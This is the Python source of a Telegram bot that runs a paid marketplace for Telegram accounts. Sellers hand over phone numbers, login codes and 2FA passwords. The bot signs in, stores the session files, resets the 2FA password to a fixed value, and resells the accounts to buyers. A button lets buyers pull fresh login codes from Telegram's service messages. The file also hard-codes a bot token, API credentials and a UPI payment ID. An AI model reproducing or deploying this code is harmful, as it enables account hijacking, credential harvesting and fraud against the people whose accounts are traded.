import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
import asyncio, os, threading, re
from flask import Flask

# --- ALIVE SERVER ---
app = Flask('')
@app.route('/')
def home(): return "BOT IS 100% RUNNING"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
db = {'users': {}, 'admins': [OWNER_ID], 'upi': 'abhay-op.315@ptyes', 'stock': {}, 'sell_rates': {}, 'buy_rates': {}, 'linked_bots': []}
active_logins = {}
if not os.path.exists('sessions'): os.makedirs('sessions')

def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

@bot.message_handler(commands=['start'])
def start(m):
    if m.from_user.id not in db['users']: db['users'][m.from_user.id] = {'balance': 0}
    bot.send_message(m.chat.id, "🚀 **SYSTEM READY v7.0**\nNo Force Join | No Refer | All Features Active.", reply_markup=main_menu())

# --- ADMIN PANEL ---
@bot.message_handler(commands=['admin'])
def adm(m):
    if not is_admin(m.from_user.id): return
    bot.send_message(m.chat.id, "👑 **ADMIN PANEL**\n\n🌍 `/addcountry NAME BUY SELL` \n➕ `/addstock` \n👤 `/addadmin ID` \n💰 `/addbal ID AMT` \n💳 `/changeupi UPI` \n🔗 `/linkbot TOKEN` \n📢 `/broadcast` ")

@bot.message_handler(commands=['addadmin'])
def add_adm(m):
    if m.from_user.id != OWNER_ID: return
    try:
        aid = int(m.text.split()[1])
        if aid not in db['admins']: db['admins'].append(aid)
        bot.reply_to(m, "✅ Admin Added.")
    except: pass

@bot.message_handler(commands=['addbal'])
def add_b(m):
    if not is_admin(m.from_user.id): return
    try:
        _, u, a = m.text.split()
        db['users'][int(u)]['balance'] += int(a)
        bot.send_message(int(u), f"🎁 ₹{a} Added!")
    except: pass

# --- LOGIN ENGINE (AUTO 2FA CHANGE) ---
def login_engine(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country, 'mode': mode}
        bot.send_message(chat_id, "📩 **OTP Sent!** Enter Code:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_otp(m):
    d = active_logins.get(m.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], m.text.strip(), phone_code_hash=d['hash']))
        finalize(m, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(m.chat.id, "🔐 **2FA Password:**")
            bot.register_next_step_handler_by_chat_id(m.chat.id, verify_2fa)
        else: bot.send_message(m.chat.id, "❌ OTP Wrong.")

def verify_2fa(m):
    d = active_logins.get(m.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=m.text.strip()))
        finalize(m, d, m.text.strip())
    except: bot.send_message(m.chat.id, "❌ Password Wrong.")

def finalize(m, d, pwd="No Password"):
    if d['mode'] == "sell":
        try: d['loop'].run_until_complete(d['client'](functions.account.UpdatePasswordSettingsRequest(new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="dob"))))
        except: pass
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{m.from_user.id}_{d['country']}"), types.InlineKeyboardButton("❌ REJECT", callback_data=f"sr_{m.from_user.id}"))
        for a in db['admins']: bot.send_message(a, f"📦 **SELL REQ**\nUser: `{m.from_user.id}`\nNum: `{d['phone']}`\nPass: `2710`", reply_markup=markup)
        bot.send_message(m.chat.id, "✅ ID Connected! 2FA changed to 2710.")
    else:
        db['stock'].setdefault(d['country'], []).append(f"{d['phone']}:PASS:{pwd}")
        bot.send_message(m.chat.id, "✅ Stock Added.")

# --- CALLBACKS (BUY BUTTONS, DEPOSIT APPROVE) ---
@bot.callback_query_handler(func=lambda call: True)
def cb(call):
    p = call.data.split('_')
    uid = call.from_user.id
    if p[0] == 'da': # Dep Approve
        db['users'][int(p[1])]['balance'] += int(p[2])
        bot.send_message(int(p[1]), "✅ Deposit Approved!")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'dr': # Dep Reject
        bot.send_message(int(p[1]), "❌ Deposit Rejected.")
        bot.edit_message_caption("Rejected ❌", call.message.chat.id, call.message.message_id)
    elif p[0] == 'sa': # Sell Approve
        db['users'][int(p[1])]['balance'] += db['sell_rates'].get(p[2], 0)
        bot.send_message(int(p[1]), "✅ ID Sale Approved!")
        bot.edit_message_text("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'buyid':
        c = p[1]
        if db['users'].get(uid, {}).get('balance', 0) < db['buy_rates'].get(c, 0) or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "Low Bal/Stock", show_alert=True)
        data = db['stock'][c].pop(0)
        db['users'][uid]['balance'] -= db['buy_rates'][c]
        phone = data.split(':')[0]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📩 GET CODE", callback_data=f"gotp_{phone}"), types.InlineKeyboardButton("🚪 LOGOUT", callback_data=f"lout_{phone}"))
        bot.send_message(uid, f"🛒 **PURCHASED**\nID: `{data}`", reply_markup=markup)
    elif p[0] in ['gotp', 'lout']:
        threading.Thread(target=otp_worker, args=(call, p[0], p[1])).start()

def otp_worker(call, action, phone):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        if action == 'gotp':
            m = loop.run_until_complete(client.get_messages(777000, limit=1))
            code = re.search(r'\b(\d{5})\b', m[0].message) if m else None
            bot.send_message(call.from_user.id, f"📩 **OTP:** `{code.group(1) if code else 'Not found'}`")
        else:
            loop.run_until_complete(client.log_out())
            bot.send_message(call.from_user.id, "✅ Session Logged Out.")
    except: pass
    finally: loop.run_until_complete(client.disconnect())

# --- BUTTON HANDLERS ---
@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def h_bal(m): bot.send_message(m.chat.id, f"💳 **Balance:** ₹{db['users'].get(m.from_user.id, {}).get('balance', 0)}")

@bot.message_handler(func=lambda m: m.text == '📞 SUPPORT')
def h_sup(m):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"))
    bot.send_message(m.chat.id, "Contact Owner:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def h_dep(m):
    msg = bot.send_message(m.chat.id, "💵 **Amount:**")
    bot.register_next_step_handler(msg, lambda m: bot.register_next_step_handler(bot.send_message(m.chat.id, f"💳 Pay: `{db['upi']}`\nSend UTR:"), lambda u: bot.send_message(m.chat.id, "📸 Send Screenshot:")))

@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def h_sell(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(m.chat.id, "Select:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def h_s_st(m):
    c = m.text.split()[1]
    msg = bot.send_message(m.chat.id, "📞 Number (+):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda ms: threading.Thread(target=login_engine, args=(m.chat.id, ms.text, c, "sell")).start())

@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def h_buy(m):
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items(): markup.add(types.InlineKeyboardButton(f"{c} - ₹{p}", callback_data=f"buyid_{c}"))
    bot.send_message(m.chat.id, "Market:", reply_markup=markup)

bot.polling(none_stop=True)
